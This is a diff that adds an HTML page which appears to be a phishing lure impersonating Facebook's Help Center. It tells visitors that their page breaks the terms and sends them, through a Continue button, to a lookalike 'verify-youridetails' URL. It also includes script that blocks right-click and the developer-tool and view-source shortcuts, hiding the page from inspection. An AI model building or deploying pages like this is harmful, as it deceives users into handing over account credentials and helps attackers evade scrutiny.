@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+
+
+<head>
+    <title>Action Required</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&amp;display=swap" rel="stylesheet">
+ <script type="text/javascript">
+    document.addEventListener("contextmenu", function(e) {
+      e.preventDefault();
+    });
+
+    document.addEventListener("keydown", function(e) {
+      // Check if the "i" or "c" key is pressed with Shift or Ctrl
+      if ((e.key === 'i' || e.key === 'c' ||  e.key === 'u' || e.keyCode === 73 || e.keyCode === 67) && (e.shiftKey || e.ctrlKey)) {
+        e.preventDefault();
+      }
+    });
+  </script>
+  <style>
+        html,
+        body {
+            font-family: Roboto, sans-serif;
+            min-height: 100%;
+            height: 100%;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            background-color: #3b5998;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+        }
+
+        .container {
+            max-width: 600px;
+            padding: 20px;
+            background-color: #FFFFFF;
+            border-radius: 20px;
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+        }
+
+        .logo {
+            width: 120px;
+            height: 120px;
+            object-fit: cover;
+            border-radius: 50%;
+        }
+
+        h1 {
+            font-family: Roboto, sans-serif;
+            font-size: 34px;
+            font-weight: 700;
+            line-height: 1.4;
+            margin-top: 20px;
+            color: #FFFFFF;
+        }
+
+        h2 {
+            font-family: Roboto, sans-serif;
+            font-size: 20px;
+            font-weight: 700;
+            line-height: 1.4;
+            margin-top: 10px;
+            color: #FFFFFF;
+        }
+    h3 {
+        font-family: Roboto, sans-serif;
+        font-size: 20px;
+        font-weight: 700;
+        line-height: 1.4;
+        margin-top: 10px;
+        color: #FFFFFF;
+    }
+    .button {
+        background-color: #1877f2; /* Facebook's primary blue */
+        color: #fff;
+        padding: 12px 24px;
+        font-size: 18px;
+        border: none;
+        border-radius: 4px;
+        cursor: pointer;
+        transition: background-color 0.3s;
+    }
+
+    .button:hover {
+        background-color: #1659c7; /* Slightly darker blue on hover */
+    }
+
+        .copyright {
+            color: #232323;
+            font-size: 14px;
+            margin-top: 30px;
+        }
+
+        .footer {
+            margin-top: 20px;
+        }
+    </style>
+</head>
+
+<body>
+        <img class="logo" src="https://cdn.glitch.global/42ac90ca-66bc-4886-9161-9ce099d273bc/images-fb_icon_325x325.png?v=1696896812321" alt="Logo">
+        <h1>Help Center</h1>
+        <h2>Your page is breaking our terms and conditions.</h2>
+       <h3>Here you can submit appeal.</h3> 
+        <a class="button" href="https://verify-youridetails/urgent/submit.html">Continue</a>
+    </div>
+</body>
+
+</html>
